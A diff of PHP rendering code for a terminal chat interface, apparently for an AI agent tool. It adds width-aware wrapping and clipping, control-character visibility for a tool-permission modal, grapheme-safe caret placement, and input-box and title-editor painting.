+                $width += Width::of($token);
+            }
+            $out .= $token;
+            if ($width >= $col) {
+                return $out . $marker . implode('', \array_slice($tokens, $i + 1));
+            }
+        }
+
+        return $out . $marker;
+    }
+
+    /**
+     * Columns to shift a centred overlay LEFT so its right edge cannot land
+     * past column `$cols`. Never positive: an overlay that already fits stays
+     * exactly where {@see Veil::composite()} centred it.
+     *
+     * Veil centres against `Width::string()` of the backdrop, and at this
+     * point the frame still carries the zone sentinels {@see scanRoot()} only
+     * strips later. Those sentinel cells count as columns, so a frame whose
+     * visible width is 62 measures 84 whenever the status bar advertises its
+     * `pane:menu` zone, and Veil centres the overlay as though the terminal
+     * were that wide - pushing the right edge off-screen. An over-wide row is
+     * exactly the absolute-cursorTo row collision {@see render()}'s tail clip
+     * exists to prevent (the diff renderer paints one logical line per
+     * physical row), so the centre is clamped rather than trusted.
+     */
+    private static function overlayLeftShift(string $backdrop, string $overlay, int $cols): int
+    {
+        $backdropWidth = 0;
+        foreach (explode("\n", $backdrop) as $line) {
+            $backdropWidth = max($backdropWidth, Width::string($line));
+        }
+
+        $overlayWidth = 0;
+        foreach (explode("\n", $overlay) as $line) {
+            $overlayWidth = max($overlayWidth, Width::string($line));
+        }
+
+        $centred = Position::CENTER->xOffset($overlayWidth, $backdropWidth);
+
+        return min(0, max(0, $cols - $overlayWidth) - $centred);
+    }
+
+    /**
+     * Make free text visible, hard-wrap it by cells and clip it for the
+     * permission modal.
+     *
+     * Visible, not sanitized-by-removal ({@see renderPermissionPrompt()} has
+     * the why): CRLF and lone CR become row breaks so both halves of a
+     * CR-overwrite show on their own rows, every other control is rendered
+     * as text by {@see permissionVisible()}, and invalid UTF-8 becomes
+     * U+FFFD. Escape sequences thereby read as inert `^[[31m`.
+     *
+     * Wrapping happens here rather than being left to `Style::width()`
+     * because that pads short lines to the modal width but does not break
+     * long ones, and a single over-wide row inside a bordered box breaks the
+     * border and (per the fixed-viewport clipping in {@see render()}) the
+     * row accounting around it. {@see Width::wrap()} counts terminal CELLS
+     * per grapheme cluster and hard-breaks an unbroken token - a long path or
+     * a base64 blob in a tool argument - between clusters. It replaced
+     * `wordwrap()`, which counts BYTES and with its cut flag split UTF-8
+     * sequences: 80 CJK characters at 40 columns came back as invalid UTF-8
+     * in rows of 4, 26 and 24 cells (audit 15b-19).
+     *
+     * `$cols` is floored at 2 because a wide (2-cell) cluster cannot fit one
+     * column at all, and {@see Width::wrap()}'s hard-break loop never
+     * advances on a cluster wider than its budget. Callers pass far more.
+     */
+    private static function wrapPermissionText(string $text, int $cols): string
+    {
+        $clean = trim(self::permissionVisible(str_replace(["\r\n", "\r"], "\n", $text)));
+        if ($clean === '') {
+            return '';
+        }
+
+        $rows = explode("\n", Width::wrap($clean, max(2, $cols)));
+
+        if (count($rows) > self::PERMISSION_PROMPT_MAX_ROWS) {
+            $hidden = count($rows) - self::PERMISSION_PROMPT_MAX_ROWS;
+            $rows = array_slice($rows, 0, self::PERMISSION_PROMPT_MAX_ROWS);
+            $rows[] = Lang::t('tui.tool.more_lines', ['count' => $hidden]);
+        }
+
+        return implode("\n", $rows);
+    }
+
+    /**
+     * The modal's "every byte is visible" transform for text that keeps its
+     * line breaks: {@see Sanitize::visibleControls()} (UTF-8 repair, C0/DEL
+     * as caret notation, C1 as `<U+00XX>`), TAB expanded to
+     * {@see Width::TAB_WIDTH} spaces, and the zone sentinels spelled out.
+     *
+     * TAB is expanded rather than shown as `^I` because it is ordinary layout
+     * in a quoted script, and a raw TAB would jump to the terminal's next tab
+     * stop - a column the wrap cannot know - so a row could overrun the box.
+     *
+     * The zone sentinels (U+E000/U+E001) are Private-Use TEXT to sugar-core,
+     * so {@see Sanitize::visibleControls()} keeps them; raw, they would forge
+     * sugar-mouse zone markup inside the modal. Every other row in the frame
+     * strips them ({@see untrusted()}), but this one spells them as
+     * `<U+E000>`/`<U+E001>`, the same codepoint form as C1: stripping an
+     * invisible character still splices the text either side of it, so the
+     * row would show `/tmp` for an argument that is really `/<U+E000>tmp`,
+     * and a gate must not show anything other than what will run.
+     */
+    private static function permissionVisible(string $text): string
+    {
+        return str_replace(
+            ["\t", Sanitize::ZONE_SENTINEL_OPEN, Sanitize::ZONE_SENTINEL_CLOSE],
+            [str_repeat(' ', Width::TAB_WIDTH), '<U+E000>', '<U+E001>'],
+            Sanitize::visibleControls($text),
+        );
+    }
+
+    /**
+     * {@see permissionVisible()} folded to ONE row for values embedded in a
+     * single line (the title, the confirm question): TAB, LF and CR are shown
+     * as `^I`, `^J` and `^M` like every other control
+     * ({@see Sanitize::visibleControls()} with layout off). Shown rather than
+     * folded to a space because a tool name has no business carrying any of
+     * them, and a gate should make that visible rather than tidy it away.
+     */
+    private static function permissionVisibleOneLine(string $text): string
+    {
+        return str_replace(
+            [Sanitize::ZONE_SENTINEL_OPEN, Sanitize::ZONE_SENTINEL_CLOSE],
+            ['<U+E000>', '<U+E001>'],
+            Sanitize::visibleControls($text, false),
+        );
+    }
+
+    /**
+     * The modal's title: the tool name through {@see permissionVisibleOneLine()},
+     * cut to `$room` cells with a trailing `…` when it does not fit, so the
+     * title can neither break into a second row nor overrun the box, and a
+     * cut name still says that it was cut.
+     */
+    private static function permissionTitle(string $name, int $room): string
+    {
+        $visible = self::permissionVisibleOneLine($name);
+        $room = max(1, $room);
+        if (Width::of($visible) <= $room) {
+            return $visible;
+        }
+
+        return Width::truncate($visible, $room - 1) . '…';
+    }
+
+    /**
+     * Floor a CODEPOINT offset onto the grapheme-cluster boundary at or
+     * before it (E5) - the one rule both caret splices share: the draft's
+     * in {@see renderInput()} and the palette query's in
+     * {@see renderPalette()}.
+     *
+     * `mb_substr()` splits codepoints, so a splice at an un-snapped offset can
+     * land between a base character and its combining mark and hand the mark
+     * to whatever glyph was spliced in. Snapping DOWN keeps every mark glued
+     * to its base and moves the caret back to where a reader would say it
+     * sits; snapping UP would silently eat the rest of the cluster behind the
+     * caret. The two ends are exact boundaries, so the common offsets - 0 and
+     * the whole string - short-circuit without a walk; a mid-text caret costs
+     * one ICU walk as far as the caret, the segmentation sugar-core's `Width`
+     * already charges for per row (E68 made `ext-intl` the guarantee).
+     */
+    private static function snapToClusterStart(string $text, int $codepointOffset): int
+    {
+        $total = mb_strlen($text, 'UTF-8');
+        if ($codepointOffset <= 0 || $codepointOffset >= $total) {
+            return max(0, min($codepointOffset, $total));
+        }
+
+        $prev = 0;
+        $cp   = 0;
+        $byte = 0;
+        while ($cp < $codepointOffset) {
+            $cluster = grapheme_extract($text, 1, 0, $byte, $next);
+            if ($cluster === false || $cluster === '') {
+                break;
+            }
+            $prev = $cp;
+            $cp   += mb_strlen($cluster, 'UTF-8');
+            $byte  = $next;
+        }
+
+        return $cp === $codepointOffset ? $codepointOffset : $prev;
+    }
+
+    /**
+     * Paint the input box.
+     *
+     * The box is painted HERE and not by `TextArea::view()`, deliberately:
+     * this styling (theme border, the "> " prompt, the block cursor) is tuned
+     * against the status-bar layout below it and the frame clip in
+     * {@see render()}, and a second render path would fight it. The widget is read for STATE only — its value and its cursor.
+     *
+     * The cursor is drawn where the widget says it is, which is what makes
+     * cursor motion visible at all; before {@see Chat::$input} existed the
+     * glyph was unconditionally appended to the end of the draft. When the
+     * cursor IS at the end, this produces byte-identical output to that
+     * older form. The offset is snapped to a grapheme-cluster boundary
+     * first (E5): the widget walks CODEPOINTS — measured, two Lefts from the
+     * end of "e" + U+0301 + "x" answer offset 1, between a base and its
+     * combining mark — and splicing a glyph there let the mark compose onto
+     * the CURSOR instead of onto its base. At every boundary offset (which
+     * is every state the keys themselves can produce) the snap answers
+     * unchanged.
+     */
+    private static function renderInput(Chat $chat, Theme $theme): string
+    {
+        // The cursor is drawn in EVERY state, in-flight included, and that is the
+        // second half of a user-reported bug rather than a cosmetic change. This
+        // line read `$chat->inFlight ? '' : '█'`, which was honest while
+        // {@see Chat::update()} swallowed every keystroke for the length of a
+        // turn — a box that cannot be typed into should not claim a caret. Typing
+        // mid-turn now works ({@see Chat::enqueuePrompt()} queues what is sent),
+        // so hiding the caret would leave the box looking dead while it is live,
+        // and the report would stand with the block fixed.
+        $cursor = '█';
+        // The in-progress input buffer is untrusted keystroke data (e.g. a
+        // bracketed-paste dump can smuggle ESC/C0/DEL). Strip it before it hits
+        // the terminal so a paste can't inject control sequences at draw time.
+        //
+        // Sanitized WHOLE and then split, rather than split and sanitized in
+        // halves: `Sanitize::untrusted()` is context-sensitive (it strips ANSI
+        // sequences, and its lone-C1 test looks BACKWARD at preceding bytes),
+        // so sanitizing two halves can emit bytes sanitizing the whole would
+        // drop. This way the painted text is exactly what it always was for
+        // every draft, and only the cursor's COLUMN is computed from a second
+        // pass over the prefix. Residual, stated because it is real and
+        // unfixable without a byte map out of the sanitizer: on a draft whose
+        // cursor sits inside an escape sequence (reachable only via a revived
+        // checkpoint row, never by typing), the two passes can disagree and
+        // the glyph lands a column or two off. Nothing unsafe reaches the
+        // terminal either way — both passes strip C0/C1.
+        $clean = self::untrusted($chat->inputBuf);
+        $at = self::snapToClusterStart(
+            $clean,
+            min(
+                mb_strlen($clean, 'UTF-8'),
+                mb_strlen(self::untrusted(
+                    mb_substr($chat->inputBuf, 0, $chat->inputCursorOffset(), 'UTF-8')
+                ), 'UTF-8'),
+            ),
+        );
+        $draft = mb_substr($clean, 0, $at, 'UTF-8')
+            . $cursor
+            . mb_substr($clean, $at, null, 'UTF-8');
+
+        // E455, a user-reported bug: this used to be `"> " . $draft` handed
+        // straight to the Style below with no width and no wrap, and
+        // `Style::render()` does not word-wrap - `Style::width()` only SIZES a
+        // box. So an ordinary long sentence painted one row wider than the
+        // terminal and ran off the right edge. Every other producer in this
+        // file is held to the pane: the transcript goes through
+        // {@see fitToPane()} and even {@see renderPermissionPrompt()}
+        // hand-rolls its own wrap. The input box was the one pane that skipped
+        // the choke point.
+        //
+        // {@see wrapToPane()}, not `wordwrap()` and not a bare
+        // `Width::wrapAnsi()`: a draft can hold wide/CJK cells, which
+        // `wordwrap()` counts in BYTES, and wrapToPane() carries the retry +
+        // {@see hardFit()} backstop for the grapheme clusters whose wrap and
+        // whose measure disagree. The block cursor is spliced in ABOVE, before
+        // the wrap, precisely so it is wrapped as the real cell it occupies
+        // rather than being appended to a row that is already full - and it is
+        // a single cluster, so no break can split it.
+        //
+        // Only the WIDTH is handled here. The height half needs nothing:
+        // {@see render()}'s tail clip slices to the last N lines and the input
+        // box sits at the tail, so a taller box costs history rows and stays
+        // visible on its own.
+        $inner = max(1, $chat->cols() - self::INPUT_CHROME_COLS);
+        // The prompt costs its 2 cells on row 1 only, but the continuation
+        // rows pay the same indent so the draft occupies ONE text column all
+        // the way down - a wrapped word that jumped left by two cells reads as
+        // a second, separate line of input. Below a pane that cannot afford
+        // the indent at all the prompt is dropped rather than shrunk: at
+        // $inner == 2 the prompt alone is the whole row and the draft would
+        // wrap at width 0.
+        $indented = $inner > self::INPUT_PROMPT_COLS;
+        $textWidth = $indented ? $inner - self::INPUT_PROMPT_COLS : $inner;
+
+        // An empty box shows the grayed guess at the next message after the
+        // cursor (→ accepts it, {@see Chat::promptSuggestion()}). Held to ONE
+        // row: it is a hint, and a hint that grew the box would shove the
+        // transcript up on every turn. The accept hint is the first thing
+        // dropped when room runs out, then the suggestion is cut.
+        $suggestion = $chat->inputBuf === '' ? $chat->promptSuggestion() : null;
+        // Roadmap P-D2: with an Agent View open the box is THAT agent's
+        // composer (Enter sends to it, not to the main model), and an empty
+        // box says so in place of the main chat's guess — which would only
+        // tempt a message to the wrong recipient.
+        $composer = self::$agentView;
+        if ($composer !== null && $chat->inputBuf === '') {
+            // The clip is ellipsised, not a hard slice: since CL-2's pane
+            // auto-dock (8013e0f20) the chat pane is a third of the window at
+            // 110 cols, and the broadcast ghost "message all N agents…"
+            // overruns that text column. A bare Width::truncate() there shed
+            // the plural s and the payload's own ellipsis and printed
+            // "message all 3 agent" — which reads as a SINGULAR addressee,
+            // inverting the one fact the ghost exists to name. clipWithEllipsis
+            // is the file's existing shared clip (session tabs); it keeps the
+            // cut honest as "message all 3 agen…".
+            $ghost = self::clipWithEllipsis(
+                self::oneLine(Lang::t('tui.input.message_agent', ['name' => self::untrusted((string) ($composer['composer'] ?? $composer['name']))])),
+                max(0, $textWidth - Width::of($cursor)),
+            );
+            if (trim($ghost) !== '') {
+                $draft = $cursor . Style::new()->foreground($theme->systemLabel)->faint()->render($ghost);
+            }
+            $suggestion = null;
+        }
+        if ($suggestion !== null) {
+            $ghost = self::oneLine($suggestion);
+            $room = $textWidth - Width::of($cursor);
+            $accept = self::suggestionAcceptHint();
+            $hint = Width::of($ghost) + Width::of($accept) <= $room
+                || $room - Width::of($accept) >= self::SUGGESTION_MIN_COLS
+                ? $accept
+                : '';
+            $ghost = Width::truncate($ghost, max(0, $room - Width::of($hint)));
+            if (trim($ghost) !== '') {
+                $draft = $cursor . Style::new()->foreground($theme->systemLabel)->faint()->render($ghost . $hint);
+            }
+        }
+
+        $rows = [];
+        foreach (self::wrapToPane($draft, $textWidth) as $i => $row) {
+            $rows[] = ($indented ? ($i === 0 ? '> ' : '  ') : '') . $row;
+        }
+
+        $box = Style::new()
+            ->border(Border::normal())
+            ->borderForeground($theme->border)
+            ->padding(0, 1)
+            ->render(implode("\n", $rows));
+
+        $titleRow = self::renderTitleEditorRow($chat, $theme);
+
+        return $titleRow === '' ? $box : $titleRow . "\n" . $box;
+    }
+
+    /** Lang key of the inline title editor's label ({@see renderTitleEditorRow()}). */
+    private const TITLE_EDITOR_LABEL = 'tui.title_editor.label';
+
+    /** Lang key of its key hint, the first thing dropped when the row runs out of room. */
+    private const TITLE_EDITOR_HINT = 'tui.title_editor.hint';
+
+    /**
+     * The inline session-title editor (roadmap P-A4) as ONE row above the
+     * input box, or '' when it is closed. One row and never more: like the
+     * box below it, a taller row would only cost history lines, and a title is
+     * one line by definition. Held to the terminal width — the hint goes
+     * first, then the label narrows to the glyph, then the draft is cut.
+     */
+    private static function renderTitleEditorRow(Chat $chat, Theme $theme): string
+    {
+        $editor = $chat->titleEditor();
+        if ($editor === null) {
+            return '';
+        }
+
+        $cols = max(1, $chat->cols());
+        $label = '✎ ' . Lang::t(self::TITLE_EDITOR_LABEL) . ' ';
+        $hint = '  ' . Lang::t(self::TITLE_EDITOR_HINT);
+        if (Width::of($label) + Width::of($hint) + 12 > $cols) {
+            $hint = '';
+        }
+        if (Width::of($label) + 8 > $cols) {
+            $label = '✎ ';
+        }
+        $room = max(1, $cols - Width::of($label) - Width::of($hint));
+        $field = Width::truncateAnsi($editor->withWidth(max(1, $room - 1))->view(), $room);
+        $faint = Style::new()->foreground($theme->systemLabel)->faint();
+
+        return Width::truncateAnsi($faint->render($label) . $field . ($hint === '' ? '' : $faint->render($hint)), $cols);
+    }
+}
